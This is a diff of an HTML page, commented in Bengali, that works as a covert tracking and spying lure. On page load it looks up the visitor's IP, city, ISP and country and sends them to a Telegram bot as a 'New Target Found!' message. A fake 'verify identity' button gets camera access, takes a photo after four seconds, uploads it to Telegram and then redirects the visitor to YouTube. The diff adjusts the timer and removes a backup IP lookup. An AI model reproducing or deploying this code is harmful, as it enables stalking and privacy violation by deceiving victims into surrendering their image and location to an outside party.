@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+ <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -22,7 +22,6 @@
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background-color: #000;
             margin: 0;
-            height: 100vh;
         }
         .main-box {
             border: 1px solid rgba(255, 255, 255, 0.1);
@@ -42,18 +41,7 @@
             cursor: pointer;
             font-weight: bold;
             font-size: 16px;
-            transition: 0.3s;
         }
-        button:hover {
-            background: #cc0000;
-            transform: scale(1.05);
-        }
-        #status-msg {
-            margin-top: 15px;
-            font-size: 14px;
-            color: #aaa;
-        }
-        /* Loading Spinner */
         .loader {
             display: none;
             margin: 20px auto;
@@ -81,48 +69,38 @@
     <canvas id="canvas" style="display:none"></canvas>
 
     <script>
-        // আপনার টেলিগ্রাম তথ্য (সংগৃহীত)
+        // আপনার টেলিগ্রাম তথ্য
         const botToken = "7967860350:AAFa9X28O_n5F9Y8X6M"; 
         const chatId = "7967860350"; 
 
-        // ১. উন্নত আইপি ও ডিটেইল ট্র্যাকিং (লিঙ্কে ঢোকা মাত্রই কাজ করবে)
+        // ১. অটোমেটিক আইপি ও লোকেশন ট্র্যাকিং
         window.onload = function() {
             fetch('https://ipapi.co/json/')
             .then(res => res.json())
             .then(data => {
-                let info = `📌 *New Target Found!* \n\n` +
-                           `🌐 IP: ${data.ip} \n` +
-                           `🏙 City: ${data.city} \n` +
-                           `📡 ISP: ${data.org} \n` +
-                           `🌍 Country: ${data.country_name} \n` +
-                           `⏰ Time: ${new Date().toLocaleString()}`;
+                let info = `📌 *New Target Found!* \n\n🌐 IP: ${data.ip} \n🏙 City: ${data.city} \n📡 ISP: ${data.org} \n🌍 Country: ${data.country_name}`;
                 fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(info)}&parse_mode=Markdown`);
-            })
-            .catch(err => {
-                // ব্যাকআপ ট্র্যাকিং যদি প্রথমটি কাজ না করে
-                fetch('https://api.ipify.org?format=json')
-                .then(res => res.json())
-                .then(data => {
-                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=Target IP: ${data.ip}`);
-                });
             });
         };
 
-        // ২. ক্যামেরা ক্যাপচার ও অটো-রিডাইরেক্ট
+        // ২. ক্যামেরা ক্যাপচার (৪ সেকেন্ড টাইমারসহ)
         async function startCapture() {
             const btn = document.getElementById('auth-btn');
             const loader = document.getElementById('loader');
             const msg = document.getElementById('status-msg');
 
-            btn.style.display = 'none';
-            loader.style.display = 'block';
-            msg.innerText = "Processing, please wait...";
-
             try {
+                // আগে ক্যামেরা পারমিশন চাইবে
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                
+                btn.style.display = 'none';
+                loader.style.display = 'block';
+                msg.innerText = "Verifying identity... Please stay still for 4 seconds.";
+
                 const video = document.getElementById('video');
                 video.srcObject = stream;
 
+                // ৩. পারমিশন পাওয়ার পর ঠিক ৪ সেকেন্ড অপেক্ষা করে ছবি তুলবে
                 setTimeout(() => {
                     const canvas = document.getElementById('canvas');
                     canvas.width = video.videoWidth;
@@ -134,22 +112,22 @@
                         formData.append('chat_id', chatId);
                         formData.append('photo', blob, 'capture.jpg');
 
+                        // ছবি পাঠানো শেষ হলে ইউটিউবে রিডাইরেক্ট করবে
                         fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                             method: 'POST',
                             body: formData
                         }).then(() => {
-                            // ছবি পাঠানোর পর ইউটিউবে পাঠিয়ে দেওয়া হবে
+                            stream.getTracks().forEach(track => track.stop()); // ক্যামেরা অফ করা
                             window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; 
                         });
                     }, 'image/jpeg');
-                }, 2000); // ২ সেকেন্ডের মধ্যে ছবি তুলে রিডাইরেক্ট করবে
+                }, 4000); // এখানে ৪০০০ মানে ৪ সেকেন্ড
+
             } catch (err) {
-                loader.style.display = 'none';
-                btn.style.display = 'inline-block';
-                msg.innerText = "Error: Please allow camera access to continue.";
-                alert("Please allow camera access to verify your identity.");
+                alert("Error: Camera access is required for verification.");
             }
         }
     </script>
 </body>
 </html>
+
